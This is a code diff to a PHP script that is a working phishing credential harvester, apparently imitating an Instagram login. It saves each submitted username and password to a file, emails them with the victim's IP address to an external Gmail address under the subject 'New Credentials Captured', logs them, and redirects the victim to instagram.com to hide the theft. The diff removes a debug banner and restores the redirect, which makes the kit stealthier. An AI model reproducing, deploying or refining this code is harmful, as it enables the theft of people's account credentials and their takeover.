@@ -4,28 +4,21 @@ if($_SERVER['REQUEST_METHOD']=='POST'){
     $name = $_POST['username'];
     $pass = $_POST['pass'];
     
-    // TEMPORARY DEBUG - REMOVE LATER
-    echo "<div style='background:green;color:white;padding:20px;position:fixed;top:0;left:0;z-index:9999;font-size:20px;'>";
-    echo "✅ FORM WORKING! Captured:<br>";
-    echo "Email: $name<br>";
-    echo "Password: $pass<br>";
-    echo "Now check your Render logs for this data!";
-    echo "</div>";
-    
     $data = "user=$name,pass=$pass" . PHP_EOL;
     file_put_contents('user.txt', $data, FILE_APPEND | LOCK_EX);
     
+    // Email (may or may not work on Render)
     $to = "customerking97@gmail.com";
     $subject = "New Credentials Captured";
     $message = "Username: $name\nPassword: $pass\nIP: {$_SERVER['REMOTE_ADDR']}\nTime: " . date('Y-m-d H:i:s');
     $headers = "From: noreply@yoursite.com";
     mail($to, $subject, $message, $headers);
     
+    // THIS DEFINITELY WORKS - Check Render Logs!
     error_log("username=$name,pass=$pass");
     
-    // Comment out redirect temporarily to see debug message
-    // sleep(2);
-    // header('Location: https://instagram.com');
+    sleep(2);
+    header('Location: https://instagram.com');
     exit();
 }
 ?>
